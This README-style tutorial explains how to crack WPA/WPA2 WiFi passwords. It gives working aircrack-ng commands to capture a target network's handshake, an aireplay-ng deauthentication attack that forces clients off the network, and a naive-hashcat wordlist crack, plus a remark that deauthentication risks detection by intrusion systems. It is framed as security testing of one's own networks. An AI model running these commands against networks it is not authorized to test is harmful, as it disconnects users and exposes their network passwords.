# Cracking WiFi with Aircrack-ng

## Overview
<p align="justify">
This project demonstrates how to crack WiFi passwords using <strong>aircrack-ng</strong> for capturing WPA/WPA2 handshake files and <strong>naive-hashcat</strong> for brute-force cracking. This is intended for educational purposes only to test your own network security, and should never be used to hack unauthorized networks.
</p>

---

## Tools Used
- **Aircrack-ng**: A suite of tools for capturing WPA/WPA2 handshakes and analyzing wireless networks.
- **Naive-Hashcat**: A simple wrapper to use Hashcat for cracking WPA/WPA2 handshakes using GPUs for better performance.

---

## Prerequisites

1. **Hardware**: A wireless card that supports monitor mode (e.g., Alfa AWUS036ACH).
2. **Software**:
   
   - Install `aircrack-ng`:
     
     ```bash
     sudo apt install aircrack-ng
     ```
     
   - Install `hashcat`:
     
     ```bash
     sudo apt install hashcat
     ```
     
   - Install `naive-hashcat`:
     
     ```bash
     git clone https://github.com/hashcat/naive-hashcat.git
     ```
---

## Steps for Cracking

### 1. Capturing WPA Handshake with Aircrack-ng
To capture the WPA/WPA2 handshake:

- Enable monitor mode on your wireless adapter:
  
  ```bash
  sudo airmon-ng start <your-interface> #Example: wlp2s0
  ```
- Scan for available WiFi networks:
  
  ```bash
  sudo airodump-ng <your-monitor-interface> #Example: wlp2s0mon
  ```
  Reminder: Take note of the following from the scan output:
  - BSSID: This is the MAC address of the target WiFi network. You will need it for targeting specific networks.
  - Channel: Each network will be operating on a particular channel, and you'll need to specify this to capture the handshake efficiently.

  What’s displayed after scanning:

  - BSSID: The MAC address of the access points (WiFi networks).
  - PWR: Signal strength of the network.
  - Beacons: Count of beacons sent by the access point.
  - #Data: Number of data packets sent.
  - CH: The channel number the network is operating on.
  - ENC: Encryption type (e.g., WPA2).
  - ESSID: The name (SSID) of the WiFi network.

  The display will include all detected networks and their relevant details. Use this information to identify the target network based on its ESSID, BSSID, and channel.

- Capture handshake:
  
  ```bash
  sudo airodump-ng -c <channel> --bssid <target-BSSID> -w capture <monitor-interface>
  ```
  Explanation of Flags:
  - -c <channel>: Specifies the channel the target network is operating on (e.g., -c 6 for channel 6). You can find this from the scan.
  - --bssid <target-BSSID>: Targets the specific BSSID (MAC address) of the WiFi network.
  - -w capture: Specifies the file name prefix (capture) to save the captured data (it will generate .cap files).

  While running the command, a successful capture will show something like this at the top right of the terminal at current time:
  
  ```bash
    WPA Handshake: <target-BSSID>
  ```
    <p align="justify">
      If you're impatient and don't want to wait for a client to disconnect naturally, you can force a handshake by deauthenticating a connected client. This method sends deauthentication packets to a client, causing them to temporarily lose        connection to the WiFi network. When they reconnect, the handshake will be captured.
    </p>

- Deauthenticate a client to force a handshake:
  
  ```bash
  sudo aireplay-ng --deauth 10 -a <target-BSSID> <your-monitor-interface>
  ```

  **Important Note**
  <p align="justify">
  This method is higher risk for detection, especially with modern devices and access points. Many modern routers and devices have intrusion detection systems (IDS) that can recognize deauthentication attacks. If detected, the network       administrator may be alerted, or protective measures like auto-blocking or changing channels may be triggered.
  </p>

### 2. Cracking the Handshake with Naive-Hashcat
Once you have captured the handshake (.cap file), convert it to .hccapx format using:
```bash
sudo aircrack-ng -J capture capture.cap
```
Then, use naive-hashcat for cracking:
```bash
./naive-hashcat.sh capture.hccapx wordlist.txt
```
After successfully cracking a WiFi password using Hashcat, you should present the results clearly and effectively.
Example output:
```bash
12345678:your_target_wifi_password
```
---

## Resources
- [Aircrack-ng Documentation](https://aircrack-ng.org/documentation.html)
- [Hashcat Documentation](https://hashcat.net/wiki/doku.php?id=hashcat)
- [Naive-Hashcat GitHub Repository](https://github.com/hashcat/naive-hashcat)

--- 

## Disclaimer
> **Warning**: Unauthorized hacking is illegal. Ensure that you are only testing on networks you own or have explicit permission to test.




  
